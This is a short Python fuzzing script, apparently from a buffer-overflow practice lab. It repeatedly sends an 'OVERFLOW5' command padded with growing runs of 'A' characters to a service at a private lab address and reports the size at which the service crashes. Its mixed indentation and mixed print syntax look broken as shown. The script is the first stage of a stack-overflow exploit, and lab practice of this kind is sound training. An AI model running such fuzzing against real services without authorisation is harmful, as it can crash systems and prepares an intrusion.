#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 200

while True:
        try:
        	print('FUZZED WITH BUFFER SIZE OF ' + str(len(buffer)))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(('10.10.217.153',1337))
                s.send(('OVERFLOW5 ' + buffer))
                s.recv(1024)
                s.close()
                sleep(1)
                buffer = buffer + "A"* 100
               

        except:
                print 'FUZZING crashed at %s bytes' % str(len(buffer))
                sys.exit()
